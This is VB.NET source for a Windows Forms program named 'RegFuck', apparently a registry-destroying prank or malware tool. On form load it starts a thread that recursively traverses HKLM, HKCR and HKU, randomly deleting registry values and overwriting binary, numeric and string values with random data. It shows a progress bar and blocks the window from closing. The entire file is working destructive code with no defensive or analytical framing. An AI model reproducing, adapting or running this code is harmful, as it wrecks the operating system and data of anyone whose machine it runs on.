Imports Microsoft.Win32
Imports System
Imports System.Threading
Imports System.Windows.Forms

Namespace RegFuck
	Partial Public Class Form2
		Inherits Form

		Private damage As Double = 0
		Public Sub New(ByVal damage As Double)
			Me.damage = damage
			InitializeComponent()
		End Sub

		Private progress As Integer
		Private max As Integer

		Private rng As New Random(Form4.seed)

		Public Sub fuckReg(ByVal key As RegistryKey, ByVal dm As Double)
			For Each k In key.GetSubKeyNames()
				Try
					fuckReg(key.OpenSubKey(k, True), dm)
				Catch e1 As Exception
				End Try
			Next k

			For Each v In key.GetValueNames()
				Try
					If rng.NextDouble() <= damage * Form4.del * dm Then
						key.DeleteValue(v)
					Else
						corruptReg(key, v, dm)
					End If
				Catch e2 As Exception
				End Try

				progress += 1
				If progress Mod Math.Ceiling(max / 100.0) = 0 Then
					progressBar1.Invoke(CType(Sub() progressBar1.Value = CInt(Math.Truncate(progress * 100.0 / max)), MethodInvoker))
				End If
			Next v
		End Sub

		Public Function countReg(ByVal key As RegistryKey) As Integer
			Dim i As Integer = key.ValueCount

			For Each k In key.GetSubKeyNames()
				Try
					i += countReg(key.OpenSubKey(k, True))
				Catch e1 As Exception
				End Try
			Next k

			Return i
		End Function

		Public Sub corruptReg(ByVal key As RegistryKey, ByVal value As String, ByVal dm As Double)
			Dim v = key.GetValue(value, Nothing, RegistryValueOptions.DoNotExpandEnvironmentNames)

			Select Case key.GetValueKind(value)
				Case RegistryValueKind.Binary
					Dim arr() As Byte = DirectCast(v, Byte())
					For i As Integer = 0 To arr.Length - 1
						If rng.NextDouble() <= damage*dm Then
							arr(i) = CByte(rng.Next(0, 256))
						End If
					Next i

				Case RegistryValueKind.DWord, RegistryValueKind.QWord
					If rng.NextDouble() <= damage*dm Then
						v = rng.Next()
					End If


				Case RegistryValueKind.String, RegistryValueKind.ExpandString
					v = corruptString(DirectCast(v, String), dm)

				Case RegistryValueKind.MultiString
					Dim strs() As String = DirectCast(v, String())

					For i As Integer = 0 To strs.Length - 1
						strs(i) = corruptString(strs(i), dm)
					Next i

			End Select

			key.SetValue(value, v, key.GetValueKind(value))
		End Sub

		Public Function corruptString(ByVal str As String, ByVal dm As Double) As String
			Dim n As String = ""

			For Each c As Char In str
				If rng.NextDouble() <= damage*dm Then
					n &= ChrW(rng.Next(32, 127))
				Else
					n &= c
				End If
			Next c

			Return n
		End Function

		Public Sub fuck()
			max += countReg(Registry.LocalMachine)
			max += countReg(Registry.ClassesRoot)
			max += countReg(Registry.Users)

			fuckReg(Registry.LocalMachine, Form4.hklm)
			fuckReg(Registry.ClassesRoot, Form4.hkcr)
			fuckReg(Registry.Users, Form4.hku)

			Invoke(CType( Sub()
				CType(New Form3(), Form3).Show()
				Hide()
			End Sub, MethodInvoker)
		   )
		End Sub

		Private Sub Form2_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
			CType(New Thread(AddressOf fuck), Thread).Start()
		End Sub

		Private Sub Form2_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles MyBase.FormClosing
			e.Cancel = True
		End Sub
	End Class
End Namespace
